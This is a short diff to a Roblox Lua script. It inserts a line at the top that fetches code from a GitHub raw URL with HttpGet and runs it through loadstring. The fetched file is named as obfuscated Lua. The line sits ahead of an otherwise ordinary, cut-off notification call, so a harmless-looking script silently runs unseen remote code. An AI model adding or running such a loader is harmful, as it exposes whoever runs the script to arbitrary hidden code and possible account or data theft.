@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LocalWendy/Help_Script/main/Lua_obfuscate.Lua"))()
+
 local CoreGui = game:GetService("StarterGui")
 
 CoreGui:SetCore("SendNotification", {
